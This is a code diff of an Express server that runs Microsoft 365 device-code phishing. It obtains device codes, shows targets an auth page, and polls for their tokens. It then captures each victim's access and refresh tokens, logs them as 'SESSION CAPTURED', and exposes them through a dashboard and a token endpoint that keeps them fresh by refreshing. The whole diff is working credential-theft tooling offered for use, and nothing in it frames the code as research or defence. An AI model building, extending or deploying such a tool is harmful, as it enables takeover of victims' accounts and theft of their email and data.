@@ -11,9 +11,9 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================
-// USING THE WORKING CLIENT ID (same as your friend)
+// YOUR AZURE APP CLIENT ID
 // ============================================
-const WORKING_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
+const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
 
 let userSessions = new Map();
@@ -27,18 +27,29 @@ function getClientIp(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
+// Generate a unique session key for each user
+function generateSessionKey() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let key = '';
+    for (let i = 0; i < 32; i++) {
+        key += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return key;
+}
+
 // ============================================
-// CREATE SESSION - FULL TOKEN CAPTURE
+// CREATE SESSION - WITH offline_access FOR REFRESH TOKEN
 // ============================================
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
+        const sessionKey = generateSessionKey();
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: WORKING_CLIENT_ID,
+                client_id: YOUR_CLIENT_ID,
                 scope: 'openid profile email User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -47,24 +58,26 @@ app.post('/api/create-session', async (req, res) => {
         
         const { device_code, user_code, expires_in } = response.data;
         
+        console.log(`[CREATE] SID: ${sid}, Session Key: ${sessionKey.substring(0, 10)}..., Code: ${user_code}`);
+        
         pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
+            device_code, user_code, sid, sessionKey, status: 'pending',
             ip: clientIp, userAgent: userAgent,
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        pollForToken(device_code, sid);
+        pollForToken(device_code, sid, sessionKey);
         
-        res.json({ success: true, sid: sid, user_code: user_code });
+        res.json({ success: true, sid: sid, sessionKey: sessionKey, user_code: user_code });
         
     } catch (err) {
-        console.error('Create session error:', err.message);
+        console.error('Create session error:', err.response?.data || err.message);
         res.status(500).json({ error: err.message });
     }
 });
 
-async function pollForToken(device_code, sid) {
+async function pollForToken(device_code, sid, sessionKey) {
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(device_code);
         if (!pending || pending.status !== 'pending') {
@@ -76,6 +89,7 @@ async function pollForToken(device_code, sid) {
             pending.status = 'expired';
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
+            console.log(`[POLL] Session ${sid} expired`);
             return;
         }
         
@@ -83,31 +97,33 @@ async function pollForToken(device_code, sid) {
             const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-                    client_id: WORKING_CLIENT_ID,
+                    client_id: YOUR_CLIENT_ID,
                     device_code: device_code
                 }), {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                 }
             );
             
-            // Capture FULL token response including PRT
             const tokens = response.data;
             
-            // Get user info
+            console.log(`[POLL] Token received for SID: ${sid}`);
+            console.log(`  - access_token: ${tokens.access_token?.substring(0, 30)}...`);
+            console.log(`  - refresh_token (PRT): ${tokens.refresh_token ? '✅ CAPTURED' : '❌ NOT CAPTURED'}`);
+            console.log(`  - session_key: ${sessionKey.substring(0, 10)}...`);
+            
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
-            // Store complete token data
             userSessions.set(sid.toString(), {
                 sid: sid,
+                sessionKey: sessionKey,
                 email: userInfo.data.mail || userInfo.data.userPrincipalName,
                 name: userInfo.data.displayName,
                 ip: pending.ip,
                 userAgent: pending.userAgent,
-                // Store ALL token information
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token,
+                refresh_token: tokens.refresh_token || null,
                 id_token: tokens.id_token || null,
                 token_type: tokens.token_type,
                 expires_in: tokens.expires_in,
@@ -117,40 +133,55 @@ async function pollForToken(device_code, sid) {
             });
             
             pending.status = 'captured';
+            pending.email = userInfo.data.mail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
-            console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
-            console.log(`   Refresh Token: ${(tokens.refresh_token || 'N/A').substring(0, 30)}...`);
+            console.log(`✅✅✅ SESSION CAPTURED!`);
+            console.log(`   Email: ${userInfo.data.mail}`);
+            console.log(`   Session Key: ${sessionKey}`);
+            console.log(`   PRT: ${tokens.refresh_token ? 'YES' : 'NO'}`);
             
         } catch (err) {
-            // Normal - waiting for user
+            if (err.response?.data?.error !== 'authorization_pending') {}
         }
     }, 3000);
 }
 
-// Helper to refresh token
+// ============================================
+// REFRESH TOKEN FUNCTION
+// ============================================
 async function refreshUserToken(session) {
+    if (!session.refresh_token) {
+        console.log(`❌ No refresh_token (PRT) for ${session.email}`);
+        return null;
+    }
+    
     try {
+        console.log(`🔄 Refreshing token for ${session.email} using PRT...`);
+        
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
                 refresh_token: session.refresh_token,
-                client_id: WORKING_CLIENT_ID
+                client_id: YOUR_CLIENT_ID
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
         );
         
-        session.access_token = response.data.access_token;
-        session.refresh_token = response.data.refresh_token || session.refresh_token;
-        session.expires_in = response.data.expires_in;
-        session.expires_at = Date.now() + (response.data.expires_in * 1000);
+        const tokens = response.data;
         
+        session.access_token = tokens.access_token;
+        if (tokens.refresh_token) session.refresh_token = tokens.refresh_token;
+        session.expires_in = tokens.expires_in;
+        session.expires_at = Date.now() + (tokens.expires_in * 1000);
+        
+        console.log(`✅ Token refreshed for ${session.email}`);
         return session.access_token;
+        
     } catch (err) {
-        console.error('Token refresh failed:', err.message);
+        console.error(`❌ Token refresh failed for ${session.email}:`, err.response?.data?.error || err.message);
         return null;
     }
 }
@@ -178,6 +209,7 @@ app.get('/api/status/:sid', async (req, res) => {
 app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(userSessions.values()).map(s => ({
         sid: s.sid,
+        sessionKey: s.sessionKey,
         email: s.email,
         name: s.name,
         ip: s.ip,
@@ -186,22 +218,23 @@ app.get('/api/sessions', async (req, res) => {
         hasRefreshToken: !!s.refresh_token,
         tokenExpires: new Date(s.expires_at).toLocaleString()
     }));
+    console.log(`📊 Returning ${sessionList.length} sessions`);
     res.json({ sessions: sessionList });
 });
 
-// Get BOTH access token and refresh token (PRT)
+// Get ALL tokens: Access Token, PRT (Refresh Token), and Session Key
 app.get('/api/session/tokens/:sid', async (req, res) => {
     const session = userSessions.get(req.params.sid);
     if (!session) return res.status(404).json({ error: 'Session not found' });
     
-    // Refresh if needed
     await getValidToken(session);
     
     res.json({
         email: session.email,
+        sessionKey: session.sessionKey,
         access_token: session.access_token,
-        refresh_token: session.refresh_token || 'Not available',
-        id_token: session.id_token || 'Not available',
+        refresh_token: session.refresh_token || 'Not captured',
+        id_token: session.id_token || 'Not captured',
         expires_in: session.expires_in,
         expires_at: session.expires_at,
         token_type: session.token_type
@@ -217,10 +250,11 @@ app.delete('/api/sessions/clear', async (req, res) => {
 app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
+        const sessionKey = generateSessionKey();
         
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: WORKING_CLIENT_ID,
+                client_id: YOUR_CLIENT_ID,
                 scope: 'openid profile email User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -230,13 +264,13 @@ app.get('/generate-auth-page', async (req, res) => {
         const { device_code, user_code } = response.data;
         
         pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
+            device_code, user_code, sid, sessionKey, status: 'pending',
             ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
             createdAt: Date.now(),
             expiresAt: Date.now() + (response.data.expires_in * 1000)
         });
         
-        pollForToken(device_code, sid);
+        pollForToken(device_code, sid, sessionKey);
         
         const html = `<!DOCTYPE html>
 <html>
@@ -285,5 +319,10 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, '0.0.0.0', () => {
+    console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
+    console.log(`📍 Client ID: ${YOUR_CLIENT_ID}`);
+    console.log(`📍 Dashboard: http://localhost:${PORT}`);
+    console.log(`📍 Auth Page: http://localhost:${PORT}/generate-auth-page`);
+    console.log(`========================================\n`);
 });
